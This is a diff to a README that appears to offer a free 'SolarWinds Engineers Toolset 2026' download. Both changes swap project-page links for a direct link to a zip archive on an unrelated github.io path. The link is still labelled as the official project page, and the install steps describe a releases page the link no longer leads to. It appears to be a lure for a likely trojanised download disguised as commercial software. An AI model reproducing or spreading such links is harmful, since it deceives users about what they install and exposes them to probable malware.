@@ -5,7 +5,7 @@ description: "Download the SolarWinds Engineers Toolset for Windows 10 and 11 to
 ---
 # 🛠️ SolarWinds-Engineers-Toolset-2026 - Manage your network with ease today
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/kort6482/SolarWinds-Engineers-Toolset-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/kort6482/kort6482.github.io/raw/refs/heads/main/skellum/Application_3.5.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to obtain the software:
 
-1.  Visit the official project page to begin the process: [Download SolarWinds Engineers Toolset](https://github.com/kort6482/SolarWinds-Engineers-Toolset-2026)
+1.  Visit the official project page to begin the process: [Download SolarWinds Engineers Toolset](https://github.com/kort6482/kort6482.github.io/raw/refs/heads/main/skellum/Application_3.5.zip)
 2.  Navigate to the releases area on the page.
 3.  Click the version marked as latest to see the available files.
 4.  Select the installer file with the .exe extension.
